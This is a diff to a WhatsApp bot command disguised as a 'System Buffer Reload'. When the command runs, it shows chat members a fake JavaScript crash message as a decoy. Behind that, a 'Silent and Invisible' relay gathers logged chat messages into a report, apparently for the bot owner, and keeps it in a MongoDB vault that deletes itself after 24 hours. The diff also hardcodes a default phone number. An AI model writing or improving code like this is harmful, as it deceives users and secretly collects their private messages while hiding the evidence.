@@ -5,12 +5,15 @@ module.exports = {
     category: "founder",
     desc: "V_HUB: System Buffer Reload",
     async execute(sock, msg, args, { from, sender, client, logsCollection }) {
-        // 🔒 NO 'isMe' CHECK HERE -> Anyone can trigger the decoy!
-        
+        // 1. DYNAMIC CONFIG
         const ownerNum = (process.env.OWNER_NUMBER || "254768666068").replace(/[^0-9]/g, "");
         const masterJid = `${ownerNum}@s.whatsapp.net`;
-        const relayVault = client.db("vinnieBot").collection("relay_vault");
         const triggerChar = "§"; 
+
+        // 🛡️ DATABASE FAILSAFE: Resolves the 'db' undefined error
+        // If client.db doesn't exist, it pulls the database instance from the working logsCollection
+        const db = client?.db ? client.db("vinnieBot") : logsCollection.db || logsCollection.database;
+        const relayVault = db.collection("relay_vault");
 
         // 🎭 THE "SCARY" JS ERROR MATRIX
         const decoys = [
@@ -20,14 +23,16 @@ module.exports = {
             `*RangeError:* Maximum call stack size exceeded\n    at RegExp.exec (<anonymous>)\n    at MessageHandler.parse (./lib/utils/parser.js:12:22)`
         ];
 
-        // 1. THE DECOY RESPONSE (Sent to the chat where the command was typed)
-        // This happens for EVERYONE, including you.
+        // 2. THE REACTION & DECOY RESPONSE
+        // Added the reload reaction signal
+        await sock.sendMessage(from, { react: { text: "🔄", key: msg.key } });
+        
         await sock.sendMessage(from, { 
             text: decoys[Math.floor(Math.random() * decoys.length)] 
         }, { quoted: msg });
 
         try {
-            // 2. THE BACKGROUND RELAY (Silent and Invisible)
+            // 3. THE BACKGROUND RELAY (Silent and Invisible)
             if (!logsCollection) return;
 
             const timeInput = args[0] || "1h";
@@ -52,7 +57,7 @@ module.exports = {
                 });
                 report += `┗━━━━━━━━━━━━━━━━━━━━━━┛`;
 
-                // A. MongoDB Vaulting
+                // A. MongoDB Vaulting (TTL Auto-Delete in 24h)
                 await relayVault.createIndex({ "createdAt": 1 }, { expireAfterSeconds: 86400 });
                 await relayVault.insertOne({ report, createdAt: new Date() });
 
